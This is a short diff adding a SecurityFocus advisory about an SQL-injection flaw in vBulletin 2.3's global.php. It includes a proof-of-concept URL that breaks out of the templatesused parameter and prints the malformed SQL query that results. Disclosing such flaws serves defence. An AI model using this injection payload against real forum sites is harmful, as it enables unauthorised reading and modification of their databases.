@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/20214/info
+
+vBulletin is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+Version 2.3 is vulnerable; other versions may also be affected.
+
+http://www.example.com/global.php?templatesused=nn,dd,'))/* 
+SELECT template,title FROM template WHERE (title IN ('nn','dd','\\\'))/*','gobutton','timezone','username_loggedout','username_loggedin','phpinclude','headinclude','header','footer','forumjumpbit','forumjump','nav_linkoff','nav_linkon','navbar','nav_joiner','pagenav','pagenav_curpage','pagenav_firstlink','pagenav_lastlink','pagenav_nextlink','pagenav_pagelink','pagenav_prevlink') AND (templatesetid=-1 OR templatesetid=1)) ORDER BY templatesetid
